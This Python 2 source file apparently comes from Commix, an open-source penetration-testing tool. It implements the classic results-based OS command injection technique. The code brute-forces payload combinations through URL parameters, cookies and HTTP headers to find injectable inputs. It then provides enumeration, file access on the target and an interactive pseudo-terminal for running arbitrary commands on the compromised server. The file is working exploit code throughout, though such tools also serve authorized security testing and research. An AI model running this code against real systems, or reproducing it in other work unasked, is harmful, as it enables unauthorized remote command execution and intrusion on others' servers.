#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (http://commixproject.com).
Copyright (c) 2014-2017 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
import time
import string
import random
import urllib
import urllib2
import HTMLParser
 
from src.utils import menu
from src.utils import logs
from src.utils import settings
from src.utils import session_handler

from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.shells import reverse_tcp

from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters

from src.core.injections.controller import checks
from src.core.injections.controller import shell_options

from src.core.injections.results_based.techniques.classic import cb_injector
from src.core.injections.results_based.techniques.classic import cb_payloads
from src.core.injections.results_based.techniques.classic import cb_enumeration
from src.core.injections.results_based.techniques.classic import cb_file_access

readline_error = False
if settings.IS_WINDOWS:
  try:
    import readline
  except ImportError:
    try:
      import pyreadline as readline
    except ImportError:
      readline_error = True
else:
  try:
    import readline
    if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
      import gnureadline as readline
  except ImportError:
    try:
      import gnureadline as readline
    except ImportError:
      readline_error = True
pass

"""
The "classic" technique on result-based OS command injection.
"""

"""
The "classic" injection technique handler.
"""
def cb_injection_handler(url, timesec, filename, http_request_method):
  
  counter = 1
  vp_flag = True
  no_result = True
  is_encoded= False
  export_injection_info = False
  injection_type = "results-based OS command injection"
  technique = "classic command injection technique"

  if not settings.LOAD_SESSION: 
    info_msg = "Testing the " + "(" + injection_type.split(" ")[0] + ") " + technique + "... "
    sys.stdout.write(settings.print_info_msg(info_msg))
    sys.stdout.flush()
    if settings.VERBOSITY_LEVEL >= 1:
      print ""
      
  i = 0
  # Calculate all possible combinations
  total = len(settings.WHITESPACE) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)
  for whitespace in settings.WHITESPACE:
    for prefix in settings.PREFIXES:
      for suffix in settings.SUFFIXES:
        for separator in settings.SEPARATORS:
          if whitespace == " ":
            whitespace = urllib.quote(whitespace) 
          # Check injection state
          settings.DETECTION_PHASE = True
          settings.EXPLOITATION_PHASE = False
          # If a previous session is available.
          if settings.LOAD_SESSION and session_handler.notification(url, technique, injection_type):
            try:
              settings.CLASSIC_STATE = True
              url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable = session_handler.injection_point_exportation(url, http_request_method)
              checks.check_for_stored_tamper(payload)
            except TypeError:
              err_msg = "An error occurred while accessing session file ('"
              err_msg += settings.SESSION_FILE + "'). "
              err_msg += "Use the '--flush-session' option."
              print settings.print_critical_msg(err_msg)
              sys.exit(0)

          else:
            i = i + 1
            # Check for bad combination of prefix and separator
            combination = prefix + separator
            if combination in settings.JUNK_COMBINATION:
              prefix = ""

            # Change TAG on every request to prevent false-positive results.
            TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) 
            
            randv1 = random.randrange(100)
            randv2 = random.randrange(100)
            randvcalc = randv1 + randv2
            
            # Define alter shell
            alter_shell = menu.options.alter_shell
            
            try:
              if alter_shell:
                # Classic -alter shell- decision payload (check if host is vulnerable).
                payload = cb_payloads.decision_alter_shell(separator, TAG, randv1, randv2)
              else:
                # Classic decision payload (check if host is vulnerable).
                payload = cb_payloads.decision(separator, TAG, randv1, randv2)
              
              # Define prefixes & suffixes
              payload = parameters.prefixes(payload, prefix)
              payload = parameters.suffixes(payload, suffix)

              # Whitespace fixation
              payload = re.sub(" ", whitespace, payload)
              
              # Check for base64 / hex encoding
              payload = checks.perform_payload_encoding(payload)

              # Check if defined "--verbose" option.
              if settings.VERBOSITY_LEVEL == 1:
                print settings.print_payload(payload)
              elif settings.VERBOSITY_LEVEL > 1:
                info_msg = "Generating a payload for injection..."
                print settings.print_info_msg(info_msg)
                print settings.print_payload(payload) 
                
              # Cookie Injection
              if settings.COOKIE_INJECTION == True:
                # Check if target host is vulnerable to cookie injection.
                vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
                response = cb_injector.cookie_injection_test(url, vuln_parameter, payload)
                
              # User-Agent Injection
              elif settings.USER_AGENT_INJECTION == True:
                # Check if target host is vulnerable to user-agent injection.
                vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)
                response = cb_injector.user_agent_injection_test(url, vuln_parameter, payload)

              # Referer Injection
              elif settings.REFERER_INJECTION == True:
                # Check if target host is vulnerable to referer injection.
                vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)
                response = cb_injector.referer_injection_test(url, vuln_parameter, payload)

              # Custom HTTP header Injection
              elif settings.CUSTOM_HEADER_INJECTION == True:
                # Check if target host is vulnerable to custom http header injection.
                vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)
                response = cb_injector.custom_header_injection_test(url, vuln_parameter, payload)

              else:
                # Check if target host is vulnerable.
                response, vuln_parameter = cb_injector.injection_test(payload, http_request_method, url)

              # Try target page reload (if it is required).
              if settings.URL_RELOAD:
                response = requests.url_reload(url, timesec)

              # Evaluate test results.
              time.sleep(timesec)
              shell = cb_injector.injection_test_results(response, TAG, randvcalc)

              if not settings.VERBOSITY_LEVEL >= 1:
                percent = ((i*100)/total)
                float_percent = "{0:.1f}".format(round(((i*100)/(total*1.0)),2))
              
                if shell == False:
                  info_msg = "Testing the " + "(" + injection_type.split(" ")[0] + ") " + technique + "... " +  "[ " + float_percent + "%" + " ]"
                  sys.stdout.write("\r" + settings.print_info_msg(info_msg))  
                  sys.stdout.flush()

                if float(float_percent) >= 99.9:
                  if no_result == True:
                    percent = Fore.RED + "FAILED" + Style.RESET_ALL
                  else:
                    percent = str(float_percent)+ "%"
                elif len(shell) != 0:
                  percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
                else:
                  percent = str(float_percent)+ "%"
                info_msg = "Testing the " + "(" + injection_type.split(" ")[0] + ") " + technique + "... " +  "[ " + percent + " ]"
                sys.stdout.write("\r" + settings.print_info_msg(info_msg))  
                sys.stdout.flush()
            
            except KeyboardInterrupt: 
              raise

            except SystemExit: 
              raise

            except:
              continue
          
          # Yaw, got shellz! 
          # Do some magic tricks!
          if shell:
            found = True
            no_result = False
            # Check injection state
            settings.DETECTION_PHASE = False
            settings.EXPLOITATION_PHASE = True
            if settings.COOKIE_INJECTION == True: 
              header_name = " cookie"
              found_vuln_parameter = vuln_parameter
              the_type = " parameter"

            elif settings.USER_AGENT_INJECTION == True: 
              header_name = " User-Agent"
              found_vuln_parameter = ""
              the_type = " HTTP header"

            elif settings.REFERER_INJECTION == True: 
              header_name = " Referer"
              found_vuln_parameter = ""
              the_type = " HTTP header"

            elif settings.CUSTOM_HEADER_INJECTION == True: 
              header_name = " " + settings.CUSTOM_HEADER_NAME
              found_vuln_parameter = ""
              the_type = " HTTP header"

            else:    
              header_name = ""
              the_type = " parameter"
              if http_request_method == "GET":
                found_vuln_parameter = parameters.vuln_GET_param(url)
              else :
                found_vuln_parameter = vuln_parameter

            if len(found_vuln_parameter) != 0 :
              found_vuln_parameter = " '" +  found_vuln_parameter + Style.RESET_ALL  + Style.BRIGHT + "'" 

            # Print the findings to log file.
            if export_injection_info == False:
              export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
            if vp_flag == True:
              vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)
            logs.update_payload(filename, counter, payload) 
            counter = counter + 1
            
            if not settings.VERBOSITY_LEVEL >= 1 and not settings.LOAD_SESSION:
              print ""

            # Print the findings to terminal.
            success_msg = "The"
            if found_vuln_parameter == " ": 
              success_msg += http_request_method + "" 
            success_msg += the_type + header_name
            success_msg += found_vuln_parameter + " seems injectable via "
            success_msg += "(" + injection_type.split(" ")[0] + ") " + technique + "."
            print settings.print_success_msg(success_msg)
            print settings.SUB_CONTENT_SIGN + "Payload: " + re.sub("%20", " ", re.sub("%2B", "+",payload)) + Style.RESET_ALL
            # Export session
            if not settings.LOAD_SESSION:
              session_handler.injection_point_importation(url, technique, injection_type, separator, shell[0], vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response=0, timesec=0, how_long=0, output_length=0, is_vulnerable=menu.options.level)
            else:
              whitespace = settings.WHITESPACE[0]
              settings.LOAD_SESSION = False  
            
            # Check for any enumeration options.
            new_line = True
            if settings.ENUMERATION_DONE == True :
              while True:
                if not menu.options.batch:
                  question_msg = "Do you want to enumerate again? [Y/n] > "
                  enumerate_again = raw_input("\n" + settings.print_question_msg(question_msg)).lower()
                else:
                  enumerate_again = ""  
                if len(enumerate_again) == 0:
                  enumerate_again = "y"
                if enumerate_again in settings.CHOICE_YES:
                  cb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
                  #print ""
                  break
                elif enumerate_again in settings.CHOICE_NO:
                  new_line = False
                  break
                elif enumerate_again in settings.CHOICE_QUIT:
                  sys.exit(0)
                else:
                  err_msg = "'" + enumerate_again + "' is not a valid answer."  
                  print settings.print_error_msg(err_msg)
                  pass
            else:
              if menu.enumeration_options():
                cb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
          
            if not menu.file_access_options() and not menu.options.os_cmd and new_line:
              print ""
            
            # Check for any system file access options.
            if settings.FILE_ACCESS_DONE == True :
              if settings.ENUMERATION_DONE != True:
                print ""
              while True:
                if not menu.options.batch:
                  question_msg = "Do you want to access files again? [Y/n] > "
                  sys.stdout.write(settings.print_question_msg(question_msg))
                  file_access_again = sys.stdin.readline().replace("\n","").lower()
                else:
                  file_access_again = ""  
                if len(file_access_again) == 0:
                   file_access_again = "y"
                if file_access_again in settings.CHOICE_YES:
                  cb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
                  print ""
                  break
                elif file_access_again in settings.CHOICE_NO: 
                  break
                elif file_access_again in settings.CHOICE_QUIT:
                  sys.exit(0)
                else:
                  err_msg = "'" + file_access_again  + "' is not a valid answer."  
                  print settings.print_error_msg(err_msg)
                  pass
            else:
              if menu.file_access_options():
                # if not menu.enumeration_options():
                #   print ""
                cb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
                print ""
              
            # Check if defined single cmd.
            if menu.options.os_cmd:
              # if not menu.file_access_options():
              #   print ""
              cb_enumeration.single_os_cmd_exec(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)

            # Pseudo-Terminal shell
            go_back = False
            go_back_again = False
            while True:
              if go_back == True:
                break 
              if not menu.options.batch:
                question_msg = "Do you want a Pseudo-Terminal shell? [Y/n] > "
                sys.stdout.write(settings.print_question_msg(question_msg))
                gotshell = sys.stdin.readline().replace("\n","").lower()
              else:
                gotshell = ""  
              if len(gotshell) == 0:
                 gotshell = "y"
              if gotshell in settings.CHOICE_YES:
                if not menu.options.batch:
                  print ""
                print "Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)"
                if readline_error:
                  checks.no_readline_module()
                while True:
                  try:
                    if not readline_error:
                      # Tab compliter
                      readline.set_completer(menu.tab_completer)
                      # MacOSX tab compliter
                      if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
                        readline.parse_and_bind("bind ^I rl_complete")
                      # Unix tab compliter
                      else:
                        readline.parse_and_bind("tab: complete")
                    cmd = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
                    cmd = checks.escaped_cmd(cmd)
                    if cmd.lower() in settings.SHELL_OPTIONS:
                      go_back, go_back_again = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE="")
                      if go_back and go_back_again == False:
                        break
                      if go_back and go_back_again:
                        return True 
                    else:
                      # Command execution results.
                      time.sleep(timesec)
                      response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
                      # Try target page reload (if it is required).
                      if settings.URL_RELOAD:
                        response = requests.url_reload(url, timesec)
                      if menu.options.ignore_session or \
                         session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
                        # Evaluate injection results.
                        try:
                          shell = cb_injector.injection_results(response, TAG, cmd)
                          shell = "".join(str(p) for p in shell)
                        except:
                          print ""
                          continue  
                        if not menu.options.ignore_session :
                          session_handler.store_cmd(url, cmd, shell, vuln_parameter)
                      else:
                        shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
                      if shell:
                        html_parser = HTMLParser.HTMLParser()
                        shell = html_parser.unescape(shell)
                        # Update logs with executed cmds and execution results.
                        logs.executed_command(filename, cmd, shell)
                      if shell != "":
                        print "\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n"
                      else:
                        if settings.VERBOSITY_LEVEL >= 1:
                          print ""
                        err_msg = "The '" + cmd + "' command, does not return any output."
                        print settings.print_critical_msg(err_msg) + "\n"

                  except KeyboardInterrupt: 
                    raise
                    
                  except SystemExit: 
                    raise

              elif gotshell in settings.CHOICE_NO:
                if checks.next_attack_vector(technique, go_back) == True:
                  break
                else:
                  if no_result == True:
                    return False 
                  else:
                    return True  

              elif gotshell in settings.CHOICE_QUIT:
                sys.exit(0)

              else:
                err_msg = "'" + gotshell + "' is not a valid answer."
                print settings.print_error_msg(err_msg)
                pass
                
  if no_result == True:
    if settings.VERBOSITY_LEVEL == 0:
      print ""
    return False
  else :
    sys.stdout.write("\r")
    sys.stdout.flush()

"""
The exploitation function.
(call the injection handler)
"""
def exploitation(url, timesec, filename, http_request_method):
  if cb_injection_handler(url, timesec, filename, http_request_method) == False:
    return False

#eof
